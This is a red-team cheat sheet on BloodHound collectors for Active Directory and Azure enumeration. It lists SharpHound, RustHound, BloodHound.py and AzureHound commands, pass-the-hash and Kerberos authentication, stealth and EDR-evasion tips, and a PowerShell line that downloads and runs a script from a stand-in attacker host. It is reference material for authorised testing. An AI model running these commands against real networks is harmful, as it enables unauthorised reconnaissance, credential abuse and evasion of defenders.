---
aliases:
  - SharpHound
  - RustHound
  - BloodHound.py
  - AzureHound
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[BloodHound & SharpHound]]"
---
# BloodHound & SharpHound - Collectors

***

## SharpHound (Default Windows)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `SharpHound.exe -c Default` | Standard collection | Standard. |
| `SharpHound.exe -c All` | Comprehensive | Slow. |
| `SharpHound.exe -c DCOnly` | DC-only (stealth) | OPSEC. |
| `SharpHound.exe -c ACL,Group,LocalAdmin,Session` | Targeted | Standard. |
| `SharpHound.exe -c All --ZipFileName output.zip` | Custom output name | Standard. |
| `SharpHound.exe -d dom.local` | Specific domain | Standard. |
| `SharpHound.exe --DomainController DC` | Specific DC | Adjacent. |
| `SharpHound.exe --LdapUsername user --LdapPassword pass` | Auth creds | Standard. |
| `SharpHound.exe --LoopDuration 24h --LoopInterval 30m` | Continuous sessions | Standard. |
| `SharpHound.exe --Stealth` | Stealth mode | OPSEC. |
| `SharpHound.exe --ExcludeDCs` | Skip DCs | OPSEC. |
| `SharpHound.exe --SkipPortCheck` | No port pre-check | OPSEC. |
| `SharpHound.exe --PrettyPrint` | Pretty JSON | Adjacent. |
| `SharpHound.exe --OutputDirectory C:\loot` | Save location | Standard. |
| `SharpHound.exe --RandomFilenames` | OPSEC | Stealth. |
| Modern: in-memory PowerShell load | Defender evasion | Adjacent. |
^ad-bh-sharphound

### SharpHound recipes

```cmd
:: Default collection
SharpHound.exe -c Default

:: Stealth (DC-only, fewer hosts queried)
SharpHound.exe -c DCOnly --Stealth

:: Targeted ACL focus
SharpHound.exe -c ACL,Group,LocalAdmin,Session

:: All with custom output
SharpHound.exe -c All --OutputDirectory C:\loot --ZipFileName domain_audit.zip

:: Continuous sessions (24h)
SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m

:: Cross-domain
SharpHound.exe -c All -d childdomain.dom.local
```

```powershell
# In-memory load (defender evasion)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
```

___

## SharpHound Collection Methods

| **Method** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| `Default` | Group, ACL, Session, Trust, ObjectProps, LocalAdmin, SPNTargets | Comprehensive. |
| `All` | Default + Container, RDP, DCOnly, GPOLocalGroup | Slowest. |
| `DCOnly` | DC-side only (LDAP queries) | Stealthier. |
| `Group` | Group memberships | Adjacent. |
| `ACL` | DACL on objects | Critical. |
| `Session` | Per-host logged-on users | Lateral. |
| `Trust` | Domain trusts | Standard. |
| `ObjectProps` | Object properties | Standard. |
| `LocalAdmin` | Local admin per host | Lateral. |
| `RDP` | RDP access per host | Lateral. |
| `Container` | OU + GPO links | Standard. |
| `GPOLocalGroup` | GPO-controlled local groups | Adjacent. |
| `LoggedOn` | Logged-on users per host | Lateral. |
| `SPNTargets` | SPN-bound users (Kerberoast) | Adjacent. |
| `CertServices` | ADCS data (BHCE 5.x+) | Modern. |
| Modern: BHCE 6.x improved | Standard | Tool. |
^ad-bh-methods

___

## RustHound (Linux + Cross-Platform)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `rusthound -d dom.local -u user -p pass --zip` | Default | Standard. |
| `rusthound --domain dom.local --username user --password pass --zip` | Long flags | Adjacent. |
| `rusthound -d dom.local -u user -p pass --ldapfqdn DC` | Specific DC | Adjacent. |
| `rusthound -d dom.local -u user -p pass -k` | Kerberos auth | Modern. |
| `-z, --zip` | Output ZIP | Standard. |
| `-o output_dir` | Output directory | Adjacent. |
| Faster than SharpHound (Rust binary) | Performance | Standard. |
| Cross-platform (Linux + Windows) | Standard | Standard. |
| Modern Rust implementation | Modern | Tool. |
| Less mature than SharpHound | Adjacent | Edge. |
| Some collection methods differ | Per-version | Edge. |
| BHCE compatible output | Standard | Tool. |
| Detection: less signatures | Edge | OPSEC. |
| Modern: emerging alternative | Standard | Tool. |
| Cross-domain support | Standard | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
^ad-bh-rusthound

### RustHound recipes

```bash
# Default collection
rusthound -d dom.local -u user@dom.local -p pass --zip

# Specific DC
rusthound -d dom.local -u user@dom.local -p pass --ldapfqdn dc01.dom.local --zip

# Kerberos auth (TGT-based)
KRB5CCNAME=user.ccache rusthound -d dom.local -u user@dom.local -k --zip

# Output to custom directory
rusthound -d dom.local -u user@dom.local -p pass --zip -o ./loot/
```

___

## BloodHound.py (Python Linux)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `bloodhound-python -d dom.local -u user -p pass -ns DC -c All --zip` | Default | Standard. |
| `bloodhound-python -d dom.local -u user -p pass -ns DC -c DCOnly` | Stealth | OPSEC. |
| `-c CollectionMethod` | Specify methods | Standard. |
| `-c All` | Comprehensive | Slow. |
| `-c Group,ACL,Session,Trust,LocalAdmin,RDP,Container,GPOLocalGroup` | Targeted | Standard. |
| `--zip` | Output ZIP | Standard. |
| `-ns DC-IP` | Name server | Required. |
| `-d dom.local` | Domain | Required. |
| `-u user -p pass` | NTLM auth | Standard. |
| `-k -no-pass` | Kerberos auth | Adjacent. |
| `-hashes :NT_HASH` | Pass-the-Hash auth | Adjacent. |
| `-aesKey AES_KEY` | AES key auth | Edge. |
| Modern: pip install bloodhound | Standard | Standard. |
| Cross-platform | Standard | Standard. |
| Adjacent: ldap3 Python lib | Standard | Adjacent. |
| Detection: bloodhound-python signatures | Defender | Adjacent. |
| Modern: continuous BHCE | Defender | Standard. |
| Compliance: red team scoped | Standard | OPSEC. |
^ad-bh-python

### BloodHound.py recipes

```bash
# Install
pip install bloodhound

# Default collection
bloodhound-python -d dom.local -u user -p pass -ns DC-IP -c All --zip

# Pass-the-Hash auth
bloodhound-python -d dom.local -u user -hashes :aad3b435...:NTHASH -ns DC-IP -c All --zip

# Kerberos auth
KRB5CCNAME=user.ccache bloodhound-python -d dom.local -u user -k -no-pass -ns DC-IP -c All --zip

# Stealth (DCOnly)
bloodhound-python -d dom.local -u user -p pass -ns DC-IP -c DCOnly --zip
```

___

## AzureHound (Cloud)

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `azurehound list users` | All Azure AD users | Standard. |
| `azurehound list groups` | All Azure AD groups | Standard. |
| `azurehound -u user -p pass -t tenant_id list` | Auth via password | Standard. |
| `azurehound --refresh-token TOKEN -t tenant_id list` | Refresh token | Adjacent. |
| `azurehound --client-id ID --client-secret SECRET -t tenant_id list` | App registration | Adjacent. |
| Output: JSON for BHCE ingest | Standard | Tool. |
| Hybrid identity (on-prem + Azure AD) | Adjacent | Adjacent. |
| Cross-correlate with on-prem AD | Standard | Audit. |
| Modern: BHCE 6.x Azure support | Modern | Tool. |
| Detection: AzureHound API events | Defender | Adjacent. |
| Microsoft Defender for Cloud Apps adjacent | Modern | Defender. |
| Compliance: red team scoped | Standard | OPSEC. |
| Adjacent: Azure AD attacks | Cross-ref | Adjacent. |
| Modern: emerging cloud focus | Standard | Tool. |
| Audit baseline | Standard | Compliance. |
| Cross-correlate with hybrid | Standard | Audit. |
^ad-bh-azurehound

### AzureHound

```bash
# Install
go install github.com/BloodHoundAD/AzureHound@latest

# Auth via password
azurehound -u user@tenant.onmicrosoft.com -p pass -t tenant_id list

# Output to file
azurehound -u user -p pass -t tenant_id list > azure_data.json

# Or via app registration
azurehound --client-id <app-id> --client-secret <secret> -t tenant_id list
```

___

## Comparison

| **Aspect** | **SharpHound** | **RustHound** | **BloodHound.py** | **AzureHound** |
|:---:|:---:|:---:|:---:|:---:|
| Platform | Windows | Cross-platform | Linux/Cross | Cross |
| Language | C# | Rust | Python | Go |
| Speed | Standard | Fast | Standard | Standard |
| Maturity | Most mature | Emerging | Mature | Modern (cloud) |
| Auth methods | NTLM, Kerberos | NTLM, Kerberos | NTLM, PtH, Kerberos, AES | Azure AD |
| Detection | EDR signatures | Less signatures | Some signatures | API logs |
| OPSEC | Standard | Stealthier | Standard | Standard |
| Modern: BHCE 6.x compat | Standard | Standard | Standard | Modern |
| ADCS support | Standard | Modern | Modern | N/A |
| Output | ZIP JSON | ZIP JSON | ZIP JSON | JSON |
| Loop sessions | Yes | Limited | No | N/A |
^ad-bh-comparison

___

## Collection OPSEC

| **Aspect** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Bulk LDAP queries = SIEM flag | Defender | Adjacent. |
| DCOnly = stealthier | Edge | OPSEC. |
| Stealth flag | SharpHound | OPSEC. |
| Random filenames | OPSEC evasion | Stealth. |
| In-memory PowerShell load | EDR evasion | Adjacent. |
| Detection: Event 1644 (LDAP query) | Defender | Adjacent. |
| Detection: bulk session enumeration | Defender ML | Modern. |
| Time-of-day pacing | Match legit | Stealth. |
| Per-engagement scope | Limited collection | OPSEC. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
| Modern: BHCE 6.x continuous | Defender side | Adjacent. |
| Cleanup: collection ZIP cleanup | Post-engagement | OPSEC. |
| Compliance: red team scoped | Standard | OPSEC. |
| Adjacent: Hosts Enumeration hub | Cross-ref | Adjacent. |
| Modern: extreme defender alerting | Critical | Standard. |
| Cross-correlate with detection | Standard | Audit. |
^ad-bh-opsec

### OPSEC-aware collection

```bash
# Stealthier (DCOnly)
bloodhound-python -d dom.local -u user -p pass -ns DC -c DCOnly --zip

# Or RustHound (less signatures)
rusthound -d dom.local -u user -p pass --zip

# Avoid bulk -c All if possible
# Per-engagement: scope to needed collection methods only
```

___

## Cross-Domain Collection

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Per-domain SharpHound run | Sequential | Standard. |
| `SharpHound.exe -d childdomain.dom.local` | Specific | Standard. |
| Forest-wide via foreach | Standard | Adjacent. |
| Cross-trust collection | Edge | Adjacent. |
| Forest root domain | Standard | Standard. |
| BloodHound.py per-domain | Standard | Standard. |
| RustHound per-domain | Standard | Standard. |
| Ingest multiple ZIPs into BHCE | Standard | Tool. |
| BHCE auto-correlates cross-domain | Modern | Tool. |
| Cross-correlate trust attributes | Standard | Audit. |
| Detection: multi-domain queries | Defender | Adjacent. |
| Modern: BHCE 6.x improved cross-domain | Modern | Tool. |
| Cypher: cross-domain queries | Custom | Tool. |
| Adjacent: Trust hub | Cross-ref | Adjacent. |
| Compliance: documented per-domain | Standard | Adjacent. |
| OPSEC: per-domain pacing | Stealth | Standard. |
^ad-bh-multidomain

### Multi-domain collection

```bash
# Per-domain via BloodHound.py
for dom in domA.local domB.local domC.local; do
  bloodhound-python -d $dom -u user@$dom -p pass -ns dc.$dom -c All --zip -o ./loot/$dom/
done

# Ingest all ZIPs into BHCE
# Drag-and-drop ZIPs into BloodHound CE upload
```

```cmd
:: SharpHound per-domain
SharpHound.exe -d domA.local -c All --OutputDirectory C:\loot\domA\
SharpHound.exe -d domB.local -c All --OutputDirectory C:\loot\domB\
```

___

## Continuous Loop Mode

| **Comando** | **Función** | **Notas** |
|:---:|:---:|:---:|
| `SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m` | Continuous sessions | Standard. |
| `--LoopDuration 24h` | Total duration | Standard. |
| `--LoopInterval 30m` | Per-loop wait | Standard. |
| `--LoopFileName loop.zip` | Output | Adjacent. |
| Use case: capture transient sessions | Catch DA logon | Strategy. |
| Modern: stealthier than bulk | Edge | OPSEC. |
| Detection: long-running collection | Defender ML | Modern. |
| Modern: BHCE auto-ingest sessions | Tool | Adjacent. |
| OPSEC: per-engagement scope | Standard | OPSEC. |
| Cross-correlate with priv user logon | Standard | Audit. |
| Adjacent: Pass-the-Ticket hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cleanup: post-engagement | Standard | OPSEC. |
| Detection: bulk session enum | Defender | Adjacent. |
| Modern: extreme alerting | Critical | Standard. |
| Time-of-day pacing | Match legit | Stealth. |
^ad-bh-loop

### Loop session capture

```cmd
:: Continuous session enumeration (24h, every 30m)
SharpHound.exe -c Session --LoopDuration 24h --LoopInterval 30m --OutputDirectory C:\loot

:: Output: multiple ZIPs over time
:: Ingest all into BHCE for full session graph
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| BloodHound CE docs | `bloodhound.specterops.io` | Tool docs. |
| SharpHound docs | `support.bloodhoundenterprise.io` | Tool docs. |
| BloodHound.py repo | `github.com/dirkjanm/BloodHound.py` | Tool. |
| RustHound repo | `github.com/OPENCYBER-FR/RustHound` | Tool. |
| AzureHound repo | `github.com/BloodHoundAD/AzureHound` | Cloud tool. |
| Specter Ops blog | `posts.specterops.io` | Research. |
| Compass Security BloodHound queries | `github.com/CompassSecurity/BloodHoundQueries` | Custom queries. |
| HackTricks BloodHound | `book.hacktricks.xyz` | Reference. |
| The Hacker Recipes BloodHound | `thehacker.recipes/ad/recon` | Reference. |
| BloodHound CE 6.x changelog | Modern features | Tool. |
| `awesome-active-directory` | GitHub | Foundation. |
| Will Schroeder BloodHound research | Specter Ops | Adversary. |
| Modern: BHCE Cypher cheatsheet | Tool docs | Reference. |
| Detection: BloodHound IOCs | Defender | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Cross-correlate with engagement | Per-engagement | Standard. |
^ad-bh-resources

***
